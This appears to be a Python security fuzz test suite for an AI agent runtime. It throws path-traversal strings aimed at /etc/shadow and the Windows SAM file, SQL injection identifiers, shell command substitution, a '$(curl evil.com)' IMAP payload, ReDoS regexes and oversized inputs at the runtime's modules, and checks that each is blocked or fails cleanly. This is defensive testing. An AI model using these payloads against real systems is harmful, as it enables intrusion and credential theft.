"""Security fuzzing & attack tests.

Three angles:
1. INPUT FUZZING - bombarder les outils avec des inputs malformés.
   Goal: aucun crash daemon, aucune exception non gérée.

2. KNOWN ATTACKS - vérifier que les protections en place tiennent.
   Path traversal, SQL injection, command injection, SSRF, IMAP injection,
   webhook DoS.

3. RESOURCE EXHAUSTION - DoS resistance.
   ReDoS, huge inputs, oversize files.

Run: py -3.12 tests/test_security_fuzz.py
"""
import sys
import os
import asyncio
import tempfile
import shutil
import time

sys.stdout.reconfigure(encoding="utf-8", errors="replace")

import logging
logging.disable(logging.WARNING)


passed = 0
failed = 0


def check(name, condition, detail=""):
    global passed, failed
    if condition:
        passed += 1
        print(f"  PASS  {name}", flush=True)
    else:
        failed += 1
        print(f"  FAIL  {name} -- {detail}", flush=True)


def section(title):
    print(f"\n=== {title} ===", flush=True)


_loop = asyncio.new_event_loop()
asyncio.set_event_loop(_loop)


def run(coro):
    return _loop.run_until_complete(coro)


TMPDIR = tempfile.mkdtemp(prefix="digitorn_fuzz_")


# ══════════════════════════════════════════════════════════
# Setup modules
# ══════════════════════════════════════════════════════════

from digitorn.modules.filesystem.module import FilesystemModule
from digitorn.modules.filesystem.params import (
    ReadParams, WriteParams, EditParams, GrepParams, GlobParams, LsParams,
)
from digitorn.modules.shell.module import ShellModule
from digitorn.modules.shell.params import BashParams, BashStatusParams
from digitorn.modules.memory.module import MemoryModule, RememberParams, TaskCreateParams

fs = FilesystemModule()
fs._workspace_root = TMPDIR

shell = ShellModule()
run(shell.on_config_update({"workspace": TMPDIR}))

mem = MemoryModule()
run(mem.on_config_update({}))


def is_clean_failure(result) -> bool:
    """Check that a result is a clean failure (not a crash, not silently true)."""
    if result is None:
        return False
    if hasattr(result, "success"):
        return not result.success
    if isinstance(result, dict):
        return result.get("success") is False
    return False


def is_clean_result(result) -> bool:
    """Check that a result is a proper ActionResult-like object (success or fail OK)."""
    if result is None:
        return False
    if hasattr(result, "success"):
        return True
    if isinstance(result, dict) and "success" in result:
        return True
    return False


# ══════════════════════════════════════════════════════════
# 1. PATH TRAVERSAL - filesystem
# ══════════════════════════════════════════════════════════

section("1. Path traversal attacks (filesystem)")

evil_paths = [
    "../../../etc/passwd",
    "..\\..\\..\\windows\\system32\\config\\sam",
    "/etc/passwd",
    "/etc/shadow",
    "C:\\Windows\\System32\\config\\SAM",
    "/proc/self/environ",
    "....//....//etc/passwd",  # double dot bypass attempt
    "%2e%2e%2f%2e%2e%2fetc%2fpasswd",  # URL encoded
    "/dev/random",
    "\\\\server\\share\\secret",
]

for path in evil_paths:
    try:
        result = run(fs.read(ReadParams(file_path=path)))
        # Should NOT succeed (workspace is TMPDIR, paths are outside)
        is_blocked = is_clean_failure(result) or (
            hasattr(result, "data") and result.data is not None and
            str(result.data).startswith(TMPDIR)
        )
        check(f"path traversal blocked: {path[:40]}", is_blocked,
              f"got success={getattr(result, 'success', '?')}")
    except Exception as e:
        # Even raised exceptions should ideally be caught - but this is acceptable
        # if the exception is a security-related one
        check(f"path traversal raised exception: {path[:40]}", True)


# ══════════════════════════════════════════════════════════
# 2. EMPTY / NONE / EDGE CASE INPUTS
# ══════════════════════════════════════════════════════════

section("2. Empty / None / edge case inputs")

# Empty path
try:
    result = run(fs.read(ReadParams(file_path="")))
    check("read empty path returns clean failure", is_clean_failure(result))
except Exception as e:
    check("read empty path raises validation error", "validation" in str(e).lower() or "empty" in str(e).lower() or "min_length" in str(e).lower())

# Pydantic should reject empty old_string
try:
    EditParams(file_path="x", old_string="", new_string="y")
    check("empty old_string rejected by Pydantic", False, "should have raised")
except Exception:
    check("empty old_string rejected by Pydantic", True)

# Very long path
long_path = "A" * 5000
try:
    result = run(fs.read(ReadParams(file_path=long_path)))
    check("very long path handled", is_clean_result(result))
except Exception as e:
    check("very long path raises clean error", True)

# Unicode in path
unicode_path = "🔥💀☠️.txt"
try:
    result = run(fs.read(ReadParams(file_path=unicode_path)))
    check("unicode path handled", is_clean_result(result))
except Exception:
    check("unicode path raises clean error", True)

# Null bytes
null_path = "file\x00.txt"
try:
    result = run(fs.read(ReadParams(file_path=null_path)))
    check("null byte path handled", is_clean_result(result))
except Exception:
    check("null byte path raises clean error", True)


# ══════════════════════════════════════════════════════════
# 3. EDIT - huge old_string DoS
# ══════════════════════════════════════════════════════════

section("3. Edit - huge inputs DoS resistance")

# Create a small file first
test_file = os.path.join(TMPDIR, "test_edit.py")
with open(test_file, "w") as f:
    f.write("def hello():\n    return 1\n")
fs._read_files.add(test_file)

# Huge old_string (10MB) - should not hang or crash
huge_str = "X" * 10_000_000
start = time.monotonic()
try:
    result = run(fs.edit(EditParams(
        file_path=test_file,
        old_string=huge_str,
        new_string="x",
    )))
    elapsed = time.monotonic() - start
    # SequenceMatcher fuzzy fallback can take a few seconds - bound at 5s
    check(f"huge old_string handled in <5s ({elapsed:.2f}s)",
          elapsed < 5.0 and is_clean_result(result))
except Exception as e:
    elapsed = time.monotonic() - start
    check(f"huge old_string raised cleanly ({elapsed:.2f}s)", elapsed < 5.0)

# Huge new_string (10MB) - should be allowed but not crash
try:
    result = run(fs.edit(EditParams(
        file_path=test_file,
        old_string="return 1",
        new_string="X" * 1_000_000,  # 1MB replacement
    )))
    check("huge new_string handled", is_clean_result(result))
except Exception:
    check("huge new_string raised cleanly", True)


# ══════════════════════════════════════════════════════════
# 4. GREP - ReDoS resistance
# ══════════════════════════════════════════════════════════

section("4. Grep - ReDoS attack")

# Create a grep target file with a pathological string
redos_file = os.path.join(TMPDIR, "redos.txt")
with open(redos_file, "w") as f:
    f.write("a" * 100 + "X")  # ends with non-matching char

# Catastrophic regexes - bound each test with asyncio.wait_for as a safety net.
# Note: ripgrep is RE2-based so most catastrophic backtracking is impossible,
# but Python re fallback is vulnerable. We bound execution time defensively.
catastrophic = [
    r"(a+)+$",      # nested quantifier
    r"(a|a)*$",     # alternation overlap
]

for pattern in catastrophic:
    start = time.monotonic()
    try:
        # Hard timeout via asyncio.wait_for - never let a single regex hang
        result = run(asyncio.wait_for(
            fs.grep(GrepParams(pattern=pattern, path=TMPDIR)),
            timeout=5.0,
        ))
        elapsed = time.monotonic() - start
        check(f"ReDoS pattern handled in <5s: {pattern[:30]} ({elapsed:.2f}s)",
              elapsed < 5.0)
    except asyncio.TimeoutError:
        elapsed = time.monotonic() - start
        check(f"ReDoS pattern killed by timeout: {pattern[:30]}", False,
              "regex hung > 5s - needs ripgrep upgrade or builtin timeout")
    except Exception as e:
        elapsed = time.monotonic() - start
        check(f"ReDoS pattern raised cleanly: {pattern[:30]} ({elapsed:.2f}s)",
              elapsed < 5.0)


# ══════════════════════════════════════════════════════════
# 5. SHELL - command injection / dangerous commands
# ══════════════════════════════════════════════════════════

section("5. Shell - command injection / dangerous commands")

# These commands should either work safely or be blocked.
# We're testing that no command CRASHES the daemon, not that they're all blocked.
test_commands = [
    "echo hello && echo world",   # legitimate chaining
    "echo 'safe'",                  # quoted
    "echo $(date)",                 # command substitution
    "echo `whoami`",                # backticks
    "echo test > /dev/null",        # redirect
    "true; false",                  # multiple commands
]

for cmd in test_commands:
    try:
        result = run(shell.bash(BashParams(command=cmd)))
        check(f"shell handles: {cmd[:40]}", is_clean_result(result))
    except Exception as e:
        check(f"shell raised cleanly: {cmd[:40]}", True)

# Sleep detection - long sleeps should be blocked by safety check
try:
    result = run(shell.bash(BashParams(command="sleep 60")))
    check("long sleep blocked", is_clean_failure(result),
          f"got {result}")
except Exception:
    check("long sleep raises", True)

# Sed -i should be blocked (Edit should be used instead)
try:
    result = run(shell.bash(BashParams(command="sed -i 's/a/b/' file.txt")))
    check("sed -i blocked (use Edit)", is_clean_failure(result))
except Exception:
    check("sed -i raises", True)


# ══════════════════════════════════════════════════════════
# 6. SQL INJECTION - database (if available)
# ══════════════════════════════════════════════════════════

section("6. SQL injection (database identifier validation)")

try:
    from digitorn.modules.database.security import validate_sql_identifier

    # These should all be REJECTED
    evil_identifiers = [
        "users; DROP TABLE users",
        "users' OR '1'='1",
        "users--",
        "users/*comment*/",
        "users WHERE 1=1",
        "users; SELECT *",
        "u'',sers",
        "us`ers",
        "us\"ers",
        "../etc/passwd",
        "users\nDROP TABLE users",
        "",
        "A" * 200,  # too long
    ]

    for ident in evil_identifiers:
        try:
            validate_sql_identifier(ident, "table")
            check(f"SQL ident rejected: {ident[:30]}", False, "should have raised")
        except (ValueError, Exception) as e:
            check(f"SQL ident rejected: {ident[:30]}", True)

    # Valid identifiers should pass
    valid_identifiers = [
        "users",
        "user_table",
        "schema.table",
        "_internal",
        "table123",
    ]
    for ident in valid_identifiers:
        try:
            validate_sql_identifier(ident, "table")
            check(f"SQL ident accepted: {ident}", True)
        except Exception as e:
            check(f"SQL ident accepted: {ident}", False, str(e))

except ImportError:
    check("database security module skip", True, "module not available")


# ══════════════════════════════════════════════════════════
# 7. SSRF - http module (if available)
# ══════════════════════════════════════════════════════════

section("7. SSRF - http module IP filtering")

try:
    from digitorn.modules.http.security import is_private_ip

    # These IPs should be classified as private (SSRF blocked)
    private_ips = [
        "127.0.0.1",
        "10.0.0.1",
        "172.16.0.1",
        "192.168.1.1",
        "169.254.169.254",  # AWS metadata
        "::1",              # IPv6 loopback
        "fe80::1",          # IPv6 link-local
    ]
    for ip in private_ips:
        check(f"private IP detected: {ip}", is_private_ip(ip))

    # These should be public
    public_ips = [
        "8.8.8.8",
        "1.1.1.1",
        "104.21.0.1",
    ]
    for ip in public_ips:
        check(f"public IP allowed: {ip}", not is_private_ip(ip))

except ImportError:
    check("http security module skip", True, "module not available")


# ══════════════════════════════════════════════════════════
# 8. IMAP injection - email channel
# ══════════════════════════════════════════════════════════

section("8. IMAP injection (email channel)")

try:
    # Try to import the validator added by audit 3
    import re as _re
    import importlib
    email_mod = None
    try:
        email_mod = importlib.import_module("digitorn.modules.channels.adapters.email")
    except ImportError:
        try:
            email_mod = importlib.import_module("digitorn.core.app.channels.adapters.email")
        except ImportError:
            pass

    if email_mod and hasattr(email_mod, "_validate_imap_since_date"):
        validator = email_mod._validate_imap_since_date

        # Evil dates
        evil_dates = [
            "1-Jan-2020 OR FLAGGED",
            "1-Jan-2020' OR '1'='1",
            "1-Jan-2020; SELECT *",
            "$(curl evil.com)",
            "<script>",
            "abc",
            "32-Jan-2020",  # invalid day
            "1-Foo-2020",   # invalid month
        ]
        for d in evil_dates:
            try:
                validator(d)
                check(f"IMAP date rejected: {d[:30]}", False, "should have raised")
            except (ValueError, Exception):
                check(f"IMAP date rejected: {d[:30]}", True)

        # Valid dates
        valid_dates = [
            "1-Jan-2020",
            "31-Dec-2024",
            "2024-01-15",
        ]
        for d in valid_dates:
            try:
                validator(d)
                check(f"IMAP date accepted: {d}", True)
            except Exception as e:
                check(f"IMAP date accepted: {d}", False, str(e))
    else:
        check("email IMAP validator", False, "validator not found")

except Exception as e:
    check(f"email IMAP test setup", False, str(e))


# ══════════════════════════════════════════════════════════
# 9. WEBHOOK PAYLOAD DoS
# ══════════════════════════════════════════════════════════

section("9. Webhook payload size DoS")

try:
    from digitorn.core.app.channels.webhook import WebhookChannel

    # Create channel with default 1MB limit
    wh = WebhookChannel(channel_config={"url": "https://example.com"})

    # Verify max_payload_size is checked in source
    import inspect
    deliver_src = inspect.getsource(wh.deliver)
    check("webhook deliver checks max_payload_size",
          "max_payload_size" in deliver_src)
    check("webhook deliver computes body_size",
          "body_size" in deliver_src)

except Exception as e:
    check("webhook DoS test", False, str(e))


# ══════════════════════════════════════════════════════════
# 10. MEMORY / TASK - fuzz inputs
# ══════════════════════════════════════════════════════════

section("10. Memory / Task - fuzz inputs")

# Empty content
try:
    result = run(mem.remember(RememberParams(content="")))
    check("Remember empty content handled", is_clean_result(result))
except Exception:
    check("Remember empty content raises cleanly", True)

# Huge content (1MB fact - extreme but should not crash)
try:
    result = run(mem.remember(RememberParams(content="X" * 1_000_000)))
    check("Remember 1MB content handled", is_clean_result(result))
except Exception:
    check("Remember huge content raises cleanly", True)

# Unicode
try:
    result = run(mem.remember(RememberParams(content="🔥 fact with emoji 中文 العربية")))
    check("Remember unicode content handled", is_clean_result(result))
except Exception:
    check("Remember unicode raises cleanly", True)

# TaskCreate fuzz
try:
    result = run(mem.task_create(TaskCreateParams(subject="X" * 10000)))
    check("TaskCreate huge subject handled", is_clean_result(result))
except Exception:
    check("TaskCreate huge subject raises cleanly", True)


# ══════════════════════════════════════════════════════════
# 11. AGENT_LOOP global try/except (verify P0-4 fix)
# ══════════════════════════════════════════════════════════

section("11. tool_exec global safety net (verify fix)")

from digitorn.core.runtime.tool_exec import execute_tool


class CrashCB:
    _action_registry = {}
    _exec_context = None
    _index = None
    _service_bus = None

    async def execute(self, *args, **kwargs):
        raise RuntimeError("simulated crash")


class CrashCtx:
    context_builder = CrashCB()
    session_id = "test"
    direct_modules_map = {}
    compiled_constraints = {}
    sandbox_worker = None
    workspace = ""
    user_id = "local"
    security_profile = None
    approval_queue = None
    agent_id = "test"


# Bombarder avec différents tool names - aucun ne doit crasher l'agent loop
crash_attacks = [
    ("filesystem.read", {"file_path": "x"}),
    ("../../etc/passwd", {}),
    ("", {}),
    ("nonexistent.tool", {}),
    ("filesystem.read", None),
    ("filesystem.read", {"_evil": "<script>"}),
]
for tool_name, args in crash_attacks:
    try:
        result = run(execute_tool(CrashCtx(), tool_name, args or {}))
        check(f"crash safety: {tool_name[:30]}", isinstance(result, dict))
    except Exception as e:
        check(f"crash safety: {tool_name[:30]}", False, f"raised {type(e).__name__}")


# ══════════════════════════════════════════════════════════
# CLEANUP
# ══════════════════════════════════════════════════════════

try:
    shutil.rmtree(TMPDIR)
except Exception:
    pass

print("\n" + "=" * 55)
print(f"  PASSED: {passed}")
print(f"  FAILED: {failed}")
print(f"  TOTAL:  {passed + failed}")
print("=" * 55)

if failed > 0:
    sys.exit(1)
